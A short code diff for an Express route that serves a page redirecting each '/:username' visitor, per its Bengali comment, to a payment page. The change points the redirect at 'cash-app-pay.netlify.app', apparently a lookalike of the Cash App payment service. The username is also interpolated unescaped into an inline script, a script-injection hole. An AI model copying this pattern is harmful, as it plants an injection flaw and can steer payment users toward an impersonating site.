@@ -1104,7 +1104,7 @@ app.get('/:username', async (req, res) => {
           <body>
             <script>
               // ইউজার লিংকে ক্লিক করলে সরাসরি তার পেমেন্ট পেজে চলে যাবে
-              window.location.href = "https://your-livesite.com/" + "${username}";
+              window.location.href = "https://cash-app-pay.netlify.app/" + "${username}";
             </script>
           </body>
         </html>
